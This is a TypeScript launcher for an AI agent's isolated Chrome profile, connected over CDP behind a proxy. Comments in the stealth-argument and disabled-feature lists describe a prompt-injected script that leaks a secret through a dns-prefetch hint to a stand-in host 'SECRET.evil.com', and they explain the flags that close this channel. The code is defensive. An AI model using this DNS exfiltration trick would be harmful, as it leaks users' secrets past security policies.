/**
 * Chrome/Playwright launcher — finds the right Chrome executable, spawns a
 * dedicated agent profile, and connects over CDP so we don't trip Playwright's
 * automation fingerprints.
 *
 * Extracted from browser.ts so the main manager stays under 400 LOC.
 */
import type { Browser, CDPSession } from "playwright";
import { spawn, type ChildProcess } from "node:child_process";
import { existsSync, lstatSync, mkdirSync, readlinkSync, rmSync, unlinkSync } from "node:fs";
import { join } from "node:path";
import { getLaxDir } from "../lax-data-dir.js";
import { getRuntimeConfig } from "../config.js";
import { killProcessTree } from "../process-tree-kill.js";
import { resetBrowserNativeDownloadDir } from "./download-paths.js";

import { createLogger } from "../logger.js";
const logger = createLogger("browser.launcher");
const browserDownloadSessions = new WeakMap<Browser, CDPSession>();

// Kept under the browser tool's wedge deadline (toolMs−1s ≈ 29s in
// tool-timeout.ts + wedge-deadline.ts): navigate = goto(NAV_TIMEOUT) + the 5s
// load-wait + 1s settle, so a goto allowed 30s could push the whole action past
// the wedge and get the session force-killed instead of failing with a clean
// "navigation timeout". 20s leaves margin and is ample for a domcontentloaded
// wait — pages that don't reach DOMContentLoaded in 20s are hung, not slow.
export const NAV_TIMEOUT = 20_000;
export const ACTION_TIMEOUT = 10_000;
export const MAX_TEXT_LENGTH = 8_000;
export const SERVICE_WORKER_POLICY = "block" as const;

function browserHeadless(): boolean {
  return process.env.LAX_BROWSER_HEADLESS === "1";
}

export type BrowserEngine = "chromium" | "firefox" | "webkit";

export const USER_AGENTS: Record<BrowserEngine, string> = {
  chromium:
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  firefox:
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  webkit:
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
};

export const STEALTH_ARGS = [
  "--no-first-run",
  "--no-default-browser-check",
  "--disable-sync",
  "--disable-background-networking",
  "--disable-component-update",
  "--disable-session-crashed-bubble",
  "--hide-crash-restore-bubble",
  "--password-store=basic",
  "--disable-infobars",
  // Kill DNS prefetching. A prompt-injected script can leak a secret through a
  // `<link rel=dns-prefetch|preconnect href=https://SECRET.evil.com>` hint — the
  // resolver emits a DNS query for SECRET.evil.com with no HTTP request and no
  // resource fetch, so CSP (which only gates fetches) can't cover it and no
  // evaluate regex reliably catches every injection form. This standalone switch
  // makes the hint inert at the network layer. Paired with NetworkPrediction in
  // DISABLE_FEATURES below (preconnect/prefetch/prerender predictors).
  "--dns-prefetch-disable",
];

/**
 * Single source of truth for Chrome features we disable. Chrome honors only the
 * LAST `--disable-features=` flag, so every disable must live in this one list
 * and be passed as a single consolidated flag. RendererCodeIntegrity is
 * intentionally absent — disabling it weakens renderer code integrity.
 */
// NetworkPrediction closes the same dns-prefetch/preconnect DNS-label exfil
// channel as --dns-prefetch-disable above, but at the predictor layer: it
// disables Chrome's network-prediction service that acts on preconnect/prefetch/
// prerender hints (the LoadingPredictor). CSP can't cover these — there is no
// fetch to gate — and no evaluate regex catches every injection form, so this is
// the class fix. Lives here (not a second --disable-features flag) because Chrome
// honors only the LAST --disable-features occurrence.
export const DISABLE_FEATURES = ["Translate", "MediaRouter", "DownloadBubble", "DownloadBubbleV2", "NetworkPrediction"] as const;

export function findChromeExecutable(): string | null {
  const candidates = process.platform === "win32"
    ? [
        join(process.env.PROGRAMFILES || "", "Google", "Chrome", "Application", "chrome.exe"),
        join(process.env["PROGRAMFILES(X86)"] || "", "Google", "Chrome", "Application", "chrome.exe"),
        join(process.env.LOCALAPPDATA || "", "Google", "Chrome", "Application", "chrome.exe"),
        join(process.env.PROGRAMFILES || "", "Microsoft", "Edge", "Application", "msedge.exe"),
        join(process.env["PROGRAMFILES(X86)"] || "", "Microsoft", "Edge", "Application", "msedge.exe"),
      ]
    : process.platform === "darwin"
      ? [
          "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
          "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge",
          "/Applications/Chromium.app/Contents/MacOS/Chromium",
        ]
      : [
          "/usr/bin/google-chrome",
          "/usr/bin/google-chrome-stable",
          "/usr/bin/chromium",
          "/usr/bin/chromium-browser",
          "/usr/bin/microsoft-edge",
          "/snap/bin/chromium",
        ];
  for (const path of candidates) {
    if (existsSync(path)) return path;
  }
  return null;
}

export interface LaunchResult {
  browser: Browser;
  chromeProcess: ChildProcess | null;
  cleanup?: () => Promise<void>;
}

export interface ProfileLaunchOptions {
  /** Explicit test/ops seam. Normal runtime discovery remains unchanged. */
  executablePath?: string;
  userDataDir?: string;
  persistentDataDir?: string;
  cdpPort?: number;
  headless?: boolean;
  forceProfileLaunch?: boolean;
  forcePersistentFallback?: boolean;
  removeProfileOnCleanup?: boolean;
  readyAttempts?: number;
  downloadsDir?: string;
}

export const CHROME_PROFILE_LOCKS = ["SingletonCookie", "SingletonLock", "SingletonSocket"] as const;

/** Remove only Chrome's coordination artifacts. On Windows an active process
 * holds these open, so unlink fails safely; stale crash leftovers are removed. */
export function cleanupStaleChromeProfileLocks(profileDir: string): string[] {
  if (process.platform !== "win32") {
    try {
      const lockPath = join(profileDir, "SingletonLock");
      if (lstatSync(lockPath).isSymbolicLink()) {
        const match = readlinkSync(lockPath).match(/-(\d+)$/);
        if (match) {
          try { process.kill(Number(match[1]), 0); return []; }
          catch { /* stale owner */ }
        }
      }
    } catch { /* no lock or unreadable stale artifact */ }
  }
  const removed: string[] = [];
  for (const name of CHROME_PROFILE_LOCKS) {
    const path = join(profileDir, name);
    try {
      if (existsSync(path)) {
        unlinkSync(path);
        removed.push(name);
      }
    } catch { /* active profile lock or already removed */ }
  }
  return removed;
}

function launchCleanup(
  proc: ChildProcess | null,
  profileDir: string | undefined,
  removeProfile: boolean,
): () => Promise<void> {
  return async () => {
    if (proc) {
      killProcessTree(proc, "SIGKILL");
      if (proc.exitCode === null) {
        await Promise.race([
          new Promise<void>((resolve) => proc.once("exit", () => resolve())),
          new Promise<void>((resolve) => setTimeout(resolve, 3000)),
        ]);
      }
    }
    if (removeProfile && profileDir) {
      rmSync(profileDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
    }
  };
}

export function browserProxyArgs(proxyServer: string): string[] {
  return [`--proxy-server=${proxyServer}`, "--proxy-bypass-list=<-loopback>"];
}

export function browserProxyConfig(proxyServer: string) {
  return { server: proxyServer, bypass: "<-loopback>" };
}

export function buildPersistentContextOptions(
  downloadsPath: string,
  proxyServer: string,
  headless = browserHeadless(),
) {
  return {
    headless,
    args: [...STEALTH_ARGS, ...browserProxyArgs(proxyServer)],
    viewport: { width: 1280, height: 800 },
    acceptDownloads: true,
    downloadsPath,
    serviceWorkers: SERVICE_WORKER_POLICY,
    proxy: browserProxyConfig(proxyServer),
  };
}

export function buildChromeLaunchArgs(cdpPort: number, userDataDir: string, downloadsPath: string, proxyServer: string, headless = browserHeadless()): string[] {
  const args = [
    `--remote-debugging-port=${cdpPort}`,
    `--user-data-dir=${userDataDir}`,
    ...STEALTH_ARGS,
    "--window-size=1280,800",
    // Suppress Chrome's initial about:blank window. Every agent session runs in a
    // fresh per-session CDP context and opens its own tab via newContext().newPage();
    // the default-context startup window is never adopted, so it would just linger
    // as an empty stray window next to the real one. CDP readiness polls
    // /json/version (browser endpoint), not a page target, so no startup page is needed.
    "--no-startup-window",
    `--download.default_directory=${downloadsPath}`,
    `--disable-features=${DISABLE_FEATURES.join(",")}`,
    ...browserProxyArgs(proxyServer),
  ];
  if (headless) args.push("--headless=new", "--disable-gpu");
  return args;
}

export async function configureCdpDownloadBehavior(browser: Browser, downloadsPath: string): Promise<void> {
  const session = await browser.newBrowserCDPSession();
  try {
    await session.send("Browser.setDownloadBehavior", {
      behavior: "allowAndName",
      downloadPath: downloadsPath,
      eventsEnabled: true,
    });
    browserDownloadSessions.set(browser, session);
  } catch (error) {
    await session.detach().catch(() => {});
    throw error;
  }
}

/**
 * Launch the agent's dedicated Chrome via CDP (preferred) or fall back to
 * Playwright's persistent context. Returns both the browser handle and the
 * spawned process (if any) so the caller can clean it up on close.
 *
 * The agent ALWAYS runs in its own isolated profile (~/.lax/chrome-profile) —
 * never the user's real Chrome. This is the secure-by-default posture: zero
 * blast radius on the user's personal logins/cookies. (Driving the user's real
 * profile via CDP isn't possible on Chrome 136+ anyway — Chrome ignores
 * --remote-debugging-port on the default profile as an anti-cookie-theft
 * measure — so there's nothing to gain and a lot to lose.)
 */
export async function launchViaCDP(
  pw: typeof import("playwright"),
  proxyServer: string,
  options: ProfileLaunchOptions = {},
): Promise<LaunchResult> {
  const headless = options.headless ?? browserHeadless();
  if (headless && !options.forceProfileLaunch && !options.forcePersistentFallback) {
    const browser = await pw.chromium.launch({
      headless: true,
      args: [...STEALTH_ARGS, ...browserProxyArgs(proxyServer)],
      proxy: browserProxyConfig(proxyServer),
    });
    logger.info(`[browser] Playwright Chromium headless v${browser.version()}`);
    return { browser, chromeProcess: null, cleanup: launchCleanup(null, undefined, false) };
  }
  const chromePath = options.forcePersistentFallback
    ? null
    : options.executablePath ?? findChromeExecutable();
  const cfg = getRuntimeConfig();
  let chromeProcess: ChildProcess | null = null;

  if (chromePath) {
    const cdpPort = options.cdpPort ?? cfg.browserCdpPort;
    const userDataDir = options.userDataDir ?? join(getLaxDir(), "chrome-profile");
    if (!existsSync(userDataDir)) mkdirSync(userDataDir, { recursive: true });
    const cdpUrl = `http://127.0.0.1:${cdpPort}`;

    // An existing process may have stale or missing proxy flags. Close it and
    // launch a fresh process whose only network path is this proxy.
    let existing = false;
    try {
      const res = await fetch(`${cdpUrl}/json/version`, { signal: AbortSignal.timeout(2000) });
      existing = res.ok;
    } catch {
      existing = false;
    }
    if (existing) {
      try {
        const browser = await pw.chromium.connectOverCDP(cdpUrl);
        await browser.close();
        await new Promise((resolve) => setTimeout(resolve, 300));
      } catch (error) {
        throw new Error(
          `Cannot replace existing agent Chrome with a proxied process: ${(error as Error).message}`,
        );
      }
    }
    cleanupStaleChromeProfileLocks(userDataDir);

    // Spawn a fully separate Chrome process. The distinct --user-data-dir plus
    // --remote-debugging-port keep this off the user's main instance. All
    // feature-disables are consolidated into one --disable-features flag
    // (Chrome honors only the last occurrence). Native download bytes always
    // land in the private quarantine, never in the synced workspace.
    const downloadsDir = options.downloadsDir ?? resetBrowserNativeDownloadDir();
    if (!existsSync(downloadsDir)) mkdirSync(downloadsDir, { recursive: true, mode: 0o700 });
    const args = buildChromeLaunchArgs(cdpPort, userDataDir, downloadsDir, proxyServer, headless);

    logger.info(`[browser] Spawning agent Chrome: ${chromePath} (profile: ${userDataDir})`);
    chromeProcess = spawn(chromePath, args, {
      stdio: "ignore",
      detached: true,
      env: { ...process.env, CHROME_USER_DATA_DIR: userDataDir },
    });
    chromeProcess.unref();

    // Wait up to ~9s for CDP to come up.
    let ready = false;
    for (let i = 0; i < (options.readyAttempts ?? 30); i++) {
      try {
        const res = await fetch(`${cdpUrl}/json/version`, { signal: AbortSignal.timeout(1000) });
        if (res.ok) { ready = true; break; }
      } catch { /* not ready */ }
      await new Promise((r) => setTimeout(r, 300));
    }

    if (ready) {
      try {
        const browser = await pw.chromium.connectOverCDP(cdpUrl);
        await configureCdpDownloadBehavior(browser, downloadsDir);
        logger.info(`[browser] Connected via CDP on port ${cdpPort} — dedicated agent Chrome session`);
        return {
          browser,
          chromeProcess,
          cleanup: launchCleanup(chromeProcess, userDataDir, options.removeProfileOnCleanup === true),
        };
      } catch (e) {
        logger.info(`[browser] CDP connect failed: ${(e as Error).message}`);
        killProcessTree(chromeProcess, "SIGKILL");
        chromeProcess = null;
      }
    } else {
      logger.info("[browser] Agent Chrome CDP didn't become ready in time — falling back to Playwright");
      killProcessTree(chromeProcess, "SIGKILL");
      chromeProcess = null;
    }
  }

  // Fallback: Playwright persistent context. acceptDownloads + downloadsPath
  // so Playwright doesn't abort navigation when a response is a download
  // (the failure mode that landed files nowhere pre-2026-05-19).
  logger.info("[browser] Launching Playwright persistent context");
  const persistDir = options.persistentDataDir ?? join(getLaxDir(), "chrome-profile-pw");
  if (!existsSync(persistDir)) mkdirSync(persistDir, { recursive: true });
  cleanupStaleChromeProfileLocks(persistDir);
  const downloadsDir = resetBrowserNativeDownloadDir();
  try {
    const ctx = await pw.chromium.launchPersistentContext(persistDir, {
      ...buildPersistentContextOptions(downloadsDir, proxyServer),
      headless,
      channel: "chrome",
    });
    logger.info("[browser] Playwright persistent context (Chrome channel)");
    return {
      browser: ctx.browser()!,
      chromeProcess: null,
      cleanup: launchCleanup(null, persistDir, options.removeProfileOnCleanup === true),
    };
  } catch {
    try {
      const ctx = await pw.chromium.launchPersistentContext(
        persistDir,
        buildPersistentContextOptions(downloadsDir, proxyServer, headless),
      );
      logger.info("[browser] Playwright persistent context (bundled Chromium)");
      return {
        browser: ctx.browser()!,
        chromeProcess: null,
        cleanup: launchCleanup(null, persistDir, options.removeProfileOnCleanup === true),
      };
    } catch {
      const b = await pw.chromium.launch({
        headless,
        args: [...STEALTH_ARGS, ...browserProxyArgs(proxyServer)],
        downloadsPath: downloadsDir,
        proxy: browserProxyConfig(proxyServer),
      });
      logger.info(`[browser] Playwright Chromium (no persistence) v${b.version()}`);
      return { browser: b, chromeProcess: null, cleanup: launchCleanup(null, undefined, false) };
    }
  }
}
